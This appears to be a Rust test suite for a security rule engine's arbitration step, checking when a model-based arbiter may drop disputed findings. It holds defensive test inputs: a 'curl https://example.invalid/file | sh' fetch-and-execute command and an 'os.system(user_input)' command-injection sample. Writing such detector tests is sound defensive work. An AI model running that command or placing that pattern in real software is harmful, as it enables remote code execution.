//! S1 arbitration contract (descriptor: `specs/descriptors/security_s1_arbitration.json`).
use std::error::Error;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use polaris_code_intel::ByteSpan;
use polaris_sdk::registry::{DecisionEngine, DecisionError};
use polaris_sdk::system_one::{
    Answer, Decision, DecisionInput, DecisionSchema, DecisionSchemaCalibration,
    DecisionSchemaCalibrationRecord, DecisionSchemaCalibrationState, DecisionSchemaFailMode,
    DecisionSchemaFailPolicy, DecisionSchemaIntegrity, DecisionSchemaThresholds, Probability,
    Question, QuestionAnswer, QuestionId, QuestionKind,
};
use polaris_security_rules::{
    ArbitrationEvidence, ArbitrationStatus, ArbitrationTrust, DiffAuditRequest, RuleEngine,
    RulePack,
};

type TestResult = Result<(), Box<dyn Error>>;

#[derive(Clone, Copy)]
enum Mode {
    Yes(f32),
    Unavailable,
    Wait,
}

struct SyntheticDecisionEngine(Mode);

impl DecisionEngine for SyntheticDecisionEngine {
    async fn decide(
        &self,
        questions: &[Question],
        _input: &DecisionInput,
    ) -> Result<Decision, DecisionError> {
        match self.0 {
            Mode::Unavailable => Err(DecisionError::Unavailable(String::from("offline fixture"))),
            Mode::Wait => {
                tokio::time::sleep(Duration::from_secs(1)).await;
                answer(questions, 0.99)
            }
            Mode::Yes(confidence) => answer(questions, confidence),
        }
    }
}

struct RecordingDecisionEngine(Arc<Mutex<Option<DecisionInput>>>);

impl DecisionEngine for RecordingDecisionEngine {
    async fn decide(
        &self,
        questions: &[Question],
        input: &DecisionInput,
    ) -> Result<Decision, DecisionError> {
        tokio::task::yield_now().await;
        let mut stored = self
            .0
            .lock()
            .map_err(|_| DecisionError::Unavailable(String::from("recording lock poisoned")))?;
        *stored = Some(input.clone());
        drop(stored);
        answer(questions, 0.001)
    }
}

fn answer(questions: &[Question], confidence: f32) -> Result<Decision, DecisionError> {
    let Some(question) = questions.first() else {
        return Err(DecisionError::InvalidSchema(String::from("empty question")));
    };
    let yes =
        Probability::new(confidence).map_err(|error| DecisionError::Model(error.to_string()))?;
    Ok(Decision {
        answers: vec![QuestionAnswer {
            question: question.id.clone(),
            answer: Answer::Noul { yes },
        }],
        latency_us: 1,
    })
}

fn schema(calibrated: bool) -> Result<DecisionSchema, Box<dyn Error>> {
    schema_with_deadline(calibrated, 5000)
}

fn schema_with_deadline(
    calibrated: bool,
    deadline_ms: u32,
) -> Result<DecisionSchema, Box<dyn Error>> {
    let calibration = if calibrated {
        DecisionSchemaCalibration::try_new(DecisionSchemaCalibrationRecord {
            state: DecisionSchemaCalibrationState::Calibrated,
            fixture_set: String::from("security-rule-fixtures-v1"),
            fixture_blake3: Some("a".repeat(64)),
            sample_count: 100,
            precision_target: Some(0.90),
            observed_precision: Some(0.95),
            observed_recall: Some(0.92),
            expected_calibration_error: Some(0.02),
            checkpoint_blake3: Some("b".repeat(64)),
            date: Some(String::from("2026-10-27T00:00:00Z")),
        })?
    } else {
        DecisionSchemaCalibration::try_new(DecisionSchemaCalibrationRecord {
            state: DecisionSchemaCalibrationState::Uncalibrated,
            fixture_set: String::new(),
            fixture_blake3: None,
            sample_count: 0,
            precision_target: None,
            observed_precision: None,
            observed_recall: None,
            expected_calibration_error: None,
            checkpoint_blake3: None,
            date: None,
        })?
    };
    Ok(DecisionSchema::try_new(
        String::from("sec.arbitrate"),
        1,
        1024,
        vec![Question {
            id: QuestionId::new("finding_valid")?,
            kind: QuestionKind::Noul {
                statement: String::from(
                    "The reported security finding is supported by the available evidence.",
                ),
            },
        }],
        DecisionSchemaThresholds::new(
            Probability::new(0.99)?,
            Probability::new(0.01)?,
            Probability::new(0.10)?,
            Probability::new(0.90)?,
        )?,
        DecisionSchemaFailPolicy::new(
            String::from("diff_arbiter"),
            DecisionSchemaFailMode::Closed,
            deadline_ms,
            DecisionSchemaIntegrity::Strict,
        )?,
        calibration,
    )?)
}

fn trust() -> Result<ArbitrationTrust, Box<dyn Error>> {
    Ok(ArbitrationTrust::new("a".repeat(64), "b".repeat(64))?)
}

fn evidence(
    findings: &[polaris_security_rules::Finding],
) -> Result<Vec<ArbitrationEvidence>, Box<dyn Error>> {
    findings
        .iter()
        .map(|finding| {
            ArbitrationEvidence::new(
                finding.snippet_digest(),
                finding.span(),
                String::from("os.system(<MASKED_ARGUMENT>)"),
                Some(String::from("changed Python call in src/test.py")),
            )
            .map_err(Into::into)
        })
        .collect()
}

fn disputed_finding() -> Result<(RuleEngine, Vec<polaris_security_rules::Finding>), Box<dyn Error>>
{
    let pack = RulePack::parse(
        "id: test\nversion: 1\nrules:\n  - id: suspicious-call\n    language: python\n    cwe: 78\n    severity: high\n    disputed: true\n    message: Review this call.\n    ast_pattern: \"os.system($ARG)\"\n",
    )?;
    let engine = RuleEngine::load(&[pack])?;
    let source = b"os.system(user_input)\n";
    let hunks = [ByteSpan::new(0, source.len())];
    let request = DiffAuditRequest::new(std::path::Path::new("src/test.py"), b"", source, &hunks);
    let findings = engine.audit_diff(&request)?.findings().to_vec();
    Ok((engine, findings))
}

#[tokio::test]
async fn timeout_keeps_findings() -> TestResult {
    let (engine, findings) = disputed_finding()?;
    let report = engine
        .arbitrate(
            &findings,
            &evidence(&findings)?,
            &SyntheticDecisionEngine(Mode::Wait),
            &schema(true)?,
            &trust()?,
            Duration::from_millis(10),
        )
        .await?;
    assert_eq!(report.findings(), findings);
    assert_eq!(report.status(), ArbitrationStatus::TimedOut);
    Ok(())
}

#[tokio::test]
async fn schema_deadline_caps_longer_caller_timeout() -> TestResult {
    let (engine, findings) = disputed_finding()?;
    let started = tokio::time::Instant::now();
    let report = engine
        .arbitrate(
            &findings,
            &evidence(&findings)?,
            &SyntheticDecisionEngine(Mode::Wait),
            &schema_with_deadline(true, 25)?,
            &trust()?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(report.findings(), findings);
    assert_eq!(report.status(), ArbitrationStatus::TimedOut);
    assert!(started.elapsed() < Duration::from_millis(500));
    Ok(())
}

#[tokio::test]
async fn over_cap_findings_return_typed_bound_before_s1_or_schema_work() -> TestResult {
    let (engine, findings) = disputed_finding()?;
    let finding = findings.first().ok_or("missing finding")?;
    let over_cap = vec![finding.clone(); 33];
    let result = engine
        .arbitrate(
            &over_cap,
            &[],
            &SyntheticDecisionEngine(Mode::Yes(0.001)),
            &schema(false)?,
            &trust()?,
            Duration::from_secs(1),
        )
        .await;
    assert!(matches!(
        result,
        Err(polaris_security_rules::RulesError::Bound(_))
    ));
    assert_eq!(over_cap.len(), 33);
    Ok(())
}

#[tokio::test]
async fn calibrated_confident_false_positive_removes_disputed_finding() -> TestResult {
    let (engine, findings) = disputed_finding()?;
    let report = engine
        .arbitrate(
            &findings,
            &evidence(&findings)?,
            &SyntheticDecisionEngine(Mode::Yes(0.001)),
            &schema(true)?,
            &trust()?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(report.findings().len(), 0);
    assert_eq!(report.removed(), 1);
    assert_eq!(report.status(), ArbitrationStatus::Applied);
    Ok(())
}

#[tokio::test]
async fn engine_error_and_uncalibrated_schema_keep_findings() -> TestResult {
    let (engine, findings) = disputed_finding()?;
    let error_report = engine
        .arbitrate(
            &findings,
            &evidence(&findings)?,
            &SyntheticDecisionEngine(Mode::Unavailable),
            &schema(true)?,
            &trust()?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(error_report.findings(), findings);
    assert_eq!(error_report.status(), ArbitrationStatus::EngineError);
    let uncalibrated_report = engine
        .arbitrate(
            &findings,
            &evidence(&findings)?,
            &SyntheticDecisionEngine(Mode::Yes(0.99)),
            &schema(false)?,
            &trust()?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(uncalibrated_report.findings(), findings);
    assert_eq!(
        uncalibrated_report.status(),
        ArbitrationStatus::Uncalibrated
    );
    Ok(())
}

#[tokio::test]
async fn undisputed_finding_is_never_removed() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    let findings = engine.audit_command("curl https://example.invalid/file | sh")?;
    assert_ne!(findings.len(), 0);
    assert!(findings.iter().all(|finding| !finding.disputed()));
    let report = engine
        .arbitrate(
            &findings,
            &[],
            &SyntheticDecisionEngine(Mode::Yes(0.99)),
            &schema(true)?,
            &trust()?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(report.findings(), findings);
    assert_eq!(report.status(), ArbitrationStatus::NoDisputedFindings);
    Ok(())
}

#[tokio::test]
async fn foreign_schema_and_missing_evidence_keep_findings() -> TestResult {
    let (engine, findings) = disputed_finding()?;
    let original = schema(true)?;
    let foreign_schema = DecisionSchema::try_new(
        String::from("unrelated.calibrated"),
        original.version(),
        original.max_chars(),
        original.questions().to_vec(),
        original.thresholds(),
        original.fail_policy().clone(),
        original.calibration().clone(),
    )?;
    let foreign = foreign_schema;
    let foreign_report = engine
        .arbitrate(
            &findings,
            &evidence(&findings)?,
            &SyntheticDecisionEngine(Mode::Yes(0.001)),
            &foreign,
            &trust()?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(foreign_report.findings(), findings);
    assert_eq!(foreign_report.status(), ArbitrationStatus::UntrustedSchema);

    let missing_report = engine
        .arbitrate(
            &findings,
            &[],
            &SyntheticDecisionEngine(Mode::Yes(0.001)),
            &schema(true)?,
            &trust()?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(missing_report.findings(), findings);
    assert_eq!(missing_report.status(), ArbitrationStatus::MissingEvidence);
    Ok(())
}

#[tokio::test]
async fn calibration_mismatch_and_foreign_finding_evidence_keep_findings() -> TestResult {
    let (engine, findings) = disputed_finding()?;
    let mismatched = engine
        .arbitrate(
            &findings,
            &evidence(&findings)?,
            &SyntheticDecisionEngine(Mode::Yes(0.001)),
            &schema(true)?,
            &ArbitrationTrust::new("c".repeat(64), "d".repeat(64))?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(mismatched.findings(), findings);
    assert_eq!(mismatched.status(), ArbitrationStatus::UntrustedCalibration);

    let finding = findings.first().ok_or("missing finding")?;
    let foreign_evidence = vec![ArbitrationEvidence::new(
        polaris_sdk::ids::Cid::from_bytes([0; 32]),
        finding.span(),
        String::from("os.system(<MASKED_ARGUMENT>)"),
        None,
    )?];
    let foreign_report = engine
        .arbitrate(
            &findings,
            &foreign_evidence,
            &SyntheticDecisionEngine(Mode::Yes(0.001)),
            &schema(true)?,
            &trust()?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(foreign_report.findings(), findings);
    assert_eq!(foreign_report.status(), ArbitrationStatus::MissingEvidence);
    Ok(())
}

#[tokio::test]
async fn only_masked_evidence_reaches_s1_and_evidence_debug_is_redacted() -> TestResult {
    let (engine, findings) = disputed_finding()?;
    let findings_evidence = evidence(&findings)?;
    let debug = format!("{:?}", findings_evidence.first().ok_or("missing evidence")?);
    assert!(!debug.contains("os.system("));
    let captured = Arc::new(Mutex::new(None));
    let report = engine
        .arbitrate(
            &findings,
            &findings_evidence,
            &RecordingDecisionEngine(Arc::clone(&captured)),
            &schema(true)?,
            &trust()?,
            Duration::from_secs(1),
        )
        .await?;
    assert_eq!(report.removed(), 1);
    let (has_masked_argument, has_original_text) = {
        let captured_input = captured.lock().map_err(|_| "recording lock poisoned")?;
        let stored = captured_input.as_ref().ok_or("S1 input was not captured")?;
        let flags = (
            stored.text.contains("<MASKED_ARGUMENT>"),
            stored.text.contains("user_input"),
        );
        drop(captured_input);
        flags
    };
    assert!(has_masked_argument);
    assert!(!has_original_text);
    Ok(())
}
